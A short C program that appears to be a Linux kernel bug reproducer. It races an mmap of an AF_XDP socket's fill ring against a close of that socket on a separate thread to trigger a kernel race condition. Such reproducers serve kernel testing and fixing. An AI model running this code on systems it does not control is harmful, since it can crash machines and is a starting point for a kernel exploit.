/*
commit_hash:37b076933a8e38e72ffd3c40d3eeb5949f38baf3
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <pthread.h>

#ifndef AF_XDP
#define AF_XDP 44
#endif
#ifndef SOL_XDP
#define SOL_XDP 283
#endif

int xdp_fd;

void *thread_mmap(void *arg) {
    int size = 0x4000;
    setsockopt(xdp_fd, SOL_XDP, 5, &size, 4);
    mmap(NULL, 0x4000, PROT_READ|PROT_WRITE, MAP_SHARED, xdp_fd, 0x100000000ULL);
    return NULL;
}

void *thread_close(void *arg) {
    usleep(10); 
    close(xdp_fd);
    return NULL;
}

int main() {
    xdp_fd = socket(AF_XDP, SOCK_RAW, 0);

    pthread_t t1, t2;
    pthread_create(&t1, NULL, thread_mmap, NULL);
    pthread_create(&t2, NULL, thread_close, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);
    return 0;
}